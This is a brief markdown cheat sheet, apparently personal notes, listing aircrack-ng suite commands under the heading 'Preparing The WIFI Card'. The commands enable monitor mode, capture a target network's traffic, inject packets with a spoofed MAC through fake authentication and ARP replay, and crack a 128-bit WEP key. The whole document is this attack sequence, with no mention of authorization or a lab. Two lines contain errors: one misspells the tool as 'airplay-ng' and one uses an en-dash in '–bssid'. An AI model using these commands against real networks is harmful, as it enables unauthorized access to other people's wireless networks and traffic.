# Airodump

## Preparing The WIFI Card

 ``` sh
modprobe -r iwl3945
modprobe ipwraw
airmon-ng start [device]
airodump-ng [device]
airodump-ng -c [channel] -w [network.out] –bssid [bssid] [device]
aireplay-ng -1 0 -a [bssid] -h 00:11:22:33:44:66 -e [essid] [device]
airplay-ng -3 -b [bssid] -h 00:11:22:33:44:66 [device]
aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b [bssid] -h 00:11:22:33:44:66 [device]
aircrack-ng -n 128 -b [bssid] [filename]-01.cap
```
